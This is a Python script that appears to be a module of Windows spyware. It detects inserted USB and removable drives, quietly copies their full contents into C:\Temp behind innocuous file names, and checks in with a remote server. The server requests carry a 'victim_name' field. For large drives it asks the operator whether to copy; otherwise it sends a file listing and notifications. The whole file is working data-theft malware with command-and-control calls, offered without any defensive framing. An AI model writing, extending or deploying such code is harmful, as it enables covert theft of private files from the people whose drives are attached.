import os
import shutil
import psutil
import json
import win32api
import requests
import config # type: ignore

CONFIG_FILE = r"C:\Temp\sysdata.dat"
TARGET_BASE_DIR = r"C:\Temp"
LARGE_DRIVE_THRESHOLD_GB = 64

def load_preferences():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_preferences(preferences):
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(preferences, f, indent=4)

def send_message_to_server(message):
    # For now, we'll just write to a local file as requested.
    # In a real scenario, this would involve sending data over a network.
    server_message_file = os.path.join(TARGET_BASE_DIR, "syslog.dat")
    os.makedirs(os.path.dirname(server_message_file), exist_ok=True)
    with open(server_message_file, 'a') as f:
        f.write(message + "\n")
    print(f"Message sent to server (written to {server_message_file}): {message}")

def get_drive_info():
    drives = []
    for partition in psutil.disk_partitions():
        if 'removable' in partition.opts:
            drive_letter = partition.mountpoint[:2] # e.g., "F:\"
            if drive_letter not in ["C:", "D:"]:
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    size_gb = usage.total / (1024**3)
                    
                    volume_name = ""
                    try:
                        # Get volume name (label) for Windows
                        volume_info = win32api.GetVolumeInformation(partition.mountpoint)
                        volume_name = volume_info[0] # The volume name is the first element
                    except Exception as volume_e:
                        print(f"Could not get volume name for {drive_letter}: {volume_e}")

                    drives.append({
                        "letter": drive_letter,
                        "name": partition.device, # This is a unique identifier for the physical device
                        "volume_name": volume_name,
                        "size_gb": size_gb,
                        "mountpoint": partition.mountpoint,
                        "device": partition.device # Keep device as a direct property
                    })
                except Exception as e:
                    print(f"Could not get info for drive {drive_letter}: {e}")
    return drives

def main():
    preferences = load_preferences()
    os.makedirs(TARGET_BASE_DIR, exist_ok=True)

    external_drives = get_drive_info()

    for drive in external_drives:
        drive_letter = drive["letter"]
        drive_name = drive["name"]
        drive_size_gb = drive["size_gb"]
        mountpoint = drive["mountpoint"]

        should_copy = drive_size_gb <= LARGE_DRIVE_THRESHOLD_GB

        if drive_size_gb > LARGE_DRIVE_THRESHOLD_GB:
            if drive_letter in preferences:
                should_copy = preferences[drive_letter]["copy"]
                if not should_copy:
                    print(f"Skipping copying from {drive_letter} (size: {drive_size_gb:.2f} GB) as per user preference.")
                    continue
            else:
                import requests
                import time
                message = (f"Laufwerk {drive_letter}: {drive_name} ist zu groß "
                           f"Größe:{drive_size_gb:.2f}GB willst du das beim nächsten mal "
                           "trotzdem alle dateien kopiert werden? ja oder nein")
                try:
                    import requests
                    # Sende Frage an Server (inkl. Victim-Name)
                    response = requests.post(f"{config.SERVER_URL}/ask_drive_question", json={
                        "victim_name": config.PC_NAME,
                        "drive_letter": drive_letter,
                        "message": message,
                        "volume": f"{drive_size_gb:.2f}GB"
                    }, timeout=10)
                    print(f"[tempsaver] POST Response: {response.status_code} - {response.text}")
                    print(f"[tempsaver] Frage an Server gesendet: {message}")
                except Exception as e:
                    print(f"[tempsaver] Fehler beim Senden der Frage an Server: {e}")
                # Anfrage an Server, bis Antwort kommt
                response = None
                wait_count = 0
                while response not in ("ja", "nein"):
                    try:
                        if wait_count == 0:
                            print(f"[tempsaver] Warte auf Server-Antwort für Drive {drive_letter}...")
                        r = requests.get(f"{config.SERVER_URL}/get_drive_response/{config.PC_NAME}/{drive_letter}", timeout=10)
                        if r.status_code == 200:
                            data = r.json()
                            response = data.get("response")
                            if response in ("yes", "no"):
                                response = "ja" if response == "yes" else "nein"
                            if response in ("ja", "nein"):
                                print(f"[tempsaver] Server-Antwort erhalten: {response}")
                                break
                        wait_count += 1
                    except Exception as e:
                        print(f"[tempsaver] Fehler bei Server-Request: {e}")
                    time.sleep(10)
                if response == "ja":
                    should_copy = True
                    preferences[drive_letter] = {"copy": True, "name": drive_name, "size_gb": drive_size_gb}
                    save_preferences(preferences)
                    send_message_to_server(f"User responded 'ja' for drive {drive_letter}.")
                else:
                    should_copy = False
                    preferences[drive_letter] = {"copy": False, "name": drive_name, "size_gb": drive_size_gb}
                    save_preferences(preferences)
                    send_message_to_server(f"User responded 'nein' for drive {drive_letter}.")
                    print(f"Skipping copying from {drive_letter} (size: {drive_size_gb:.2f} GB) as per server response.")
                    continue

        if should_copy:
            # Check available space on C:
            c_drive = psutil.disk_usage("C:\\")
            available_gb = c_drive.free / (1024**3)
            drive_usage = psutil.disk_usage(mountpoint)
            required_gb = drive_usage.used / (1024**3)
            
            if available_gb < required_gb:
                # Not enough space, create .txt with list
                list_file = os.path.join(TARGET_BASE_DIR, f"{drive_letter.replace(':', '')}_file_list.txt")
                print(f"Not enough space on C: ({available_gb:.2f} GB free, {required_gb:.2f} GB needed). Creating file list at {list_file}")
                try:
                    with open(list_file, 'w', encoding='utf-8') as f:
                        f.write(f"File list for drive {drive_letter} ({drive_size_gb:.2f} GB)\n")
                        f.write("Not enough space on C: drive to copy all files.\n\n")
                        for root, dirs, files in os.walk(mountpoint):
                            level = root.replace(mountpoint, '').count(os.sep)
                            indent = ' ' * 2 * level
                            f.write(f"{indent}{os.path.basename(root)}/\n")
                            subindent = ' ' * 2 * (level + 1)
                            for file in files:
                                f.write(f"{subindent}{file}\n")
                    # Send notification
                    message = f"Not enough space on C: drive to copy USB {drive_letter} ({drive_size_gb:.2f} GB). File list created."
                    try:
                        requests.post(f"{config.SERVER_URL}/send_notification", json={
                            "victim_name": config.PC_NAME,
                            "message": message
                        }, timeout=10)
                    except Exception as e:
                        print(f"Error sending notification: {e}")
                except Exception as e:
                    print(f"Error creating file list: {e}")
                continue
            
            target_drive_dir = os.path.join(TARGET_BASE_DIR, drive_letter.replace(":", ""))
            os.makedirs(target_drive_dir, exist_ok=True)
            
            print(f"Copying files from {mountpoint} to {target_drive_dir}...")
            
            # Copy all files and directories
            for item in os.listdir(mountpoint):
                s = os.path.join(mountpoint, item)
                d = os.path.join(target_drive_dir, item)
                try:
                    if os.path.isdir(s):
                        shutil.copytree(s, d, dirs_exist_ok=True)
                    else:
                        shutil.copy2(s, d)
                    print(f"Copied: {s}")
                except Exception as e:
                    print(f"Error copying {s}: {e}")
            print(f"Finished copying from {mountpoint}.")
            
            # Send notification
            message = f"USB drive {drive_letter} ({drive_size_gb:.2f} GB) copied to C:\\Temp."
            try:
                requests.post(f"{config.SERVER_URL}/send_notification", json={
                    "victim_name": config.PC_NAME,
                    "message": message
                }, timeout=10)
            except Exception as e:
                print(f"Error sending notification: {e}")

if __name__ == "__main__":
    main()
